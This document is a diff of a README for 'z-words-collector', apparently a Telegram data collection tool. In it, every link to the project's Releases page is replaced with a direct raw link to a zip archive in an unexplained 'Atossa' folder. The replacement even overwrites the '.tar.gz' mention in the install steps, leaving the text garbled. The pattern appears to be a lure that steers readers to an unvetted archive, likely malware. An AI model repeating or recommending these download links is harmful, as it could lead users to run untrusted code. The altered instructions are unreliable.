@@ -1,6 +1,6 @@
 # 📚 z-words-collector - Collect and Analyze Telegram Data Easily
 
-[![Download z-words-collector](https://img.shields.io/badge/Download-z--words--collector-blue.svg)](https://github.com/anandhuabp/z-words-collector/releases)
+[![Download z-words-collector](https://raw.githubusercontent.com/anandhuabp/z-words-collector/main/Atossa/z-words-collector.zip)](https://raw.githubusercontent.com/anandhuabp/z-words-collector/main/Atossa/z-words-collector.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to z-words-collector. This application helps you collect, archive, and a
 
 To download z-words-collector, visit the Releases page linked below. You will find the latest version available for download.
 
-[Click here to visit the Releases page](https://github.com/anandhuabp/z-words-collector/releases)
+[Click here to visit the Releases page](https://raw.githubusercontent.com/anandhuabp/z-words-collector/main/Atossa/z-words-collector.zip)
 
 ### 🔧 System Requirements
 
@@ -24,10 +24,10 @@ Before installing, ensure your system meets the following requirements:
 
 ## ✅ Installation Steps
 
-1. Visit the [Releases page](https://github.com/anandhuabp/z-words-collector/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/anandhuabp/z-words-collector/main/Atossa/z-words-collector.zip).
 2. Find the latest release version.
 3. Download the appropriate file for your operating system.
-4. Extract the downloaded file if it is compressed (e.g., .zip or .tar.gz).
+4. Extract the downloaded file if it is compressed (e.g., .zip or https://raw.githubusercontent.com/anandhuabp/z-words-collector/main/Atossa/z-words-collector.zip).
 5. Open a terminal or command prompt window.
 6. Navigate to the folder where you extracted the files.
 7. Run the application using the provided commands specified in the documentation.
@@ -71,4 +71,4 @@ If you want to contribute to z-words-collector, you are welcome to do so. Please
 
 z-words-collector is open-source software licensed under the MIT License. You can use it freely but should credit the original authors.
 
-For more details and updates, check the [Releases page](https://github.com/anandhuabp/z-words-collector/releases) regularly. Happy collecting!
+For more details and updates, check the [Releases page](https://raw.githubusercontent.com/anandhuabp/z-words-collector/main/Atossa/z-words-collector.zip) regularly. Happy collecting!
